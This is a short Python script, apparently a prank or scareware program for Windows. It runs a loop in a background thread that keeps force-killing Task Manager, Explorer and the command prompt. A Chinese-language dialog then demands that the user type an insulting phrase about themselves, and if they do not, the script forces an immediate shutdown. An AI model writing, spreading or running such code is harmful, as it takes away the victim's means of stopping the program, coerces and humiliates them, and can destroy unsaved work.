import os,easygui,_thread
def p():
	import os
	while True:
		os.popen('taskkill /F /T /im "Taskmgr.exe"').close()
		os.popen('taskkill /F /T /im "explorer.exe"').close()
		os.popen('taskkill /F /T /im "cmd.exe"').close()
_thread.start_new_thread(p,())
f=easygui.enterbox("请输入“我是SB”，否则电脑即将关机")
if f!="我是SB":
	os.system("shutdown /s /f /t 0")